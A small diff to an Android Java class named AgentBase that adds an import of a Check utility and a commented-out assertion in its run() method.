@@ -10,6 +10,7 @@ package com.ht.RCSAndroidGUI.agent;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.ThreadBase;
+import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -38,6 +39,7 @@ public abstract class AgentBase extends ThreadBase implements Runnable {
 	 * @see java.lang.Thread#run()
 	 */
 	public synchronized void run() {
+		//Check.asserts(agentEnabled, string)
 		status = Agent.AGENT_RUNNING;
 
 		begin();
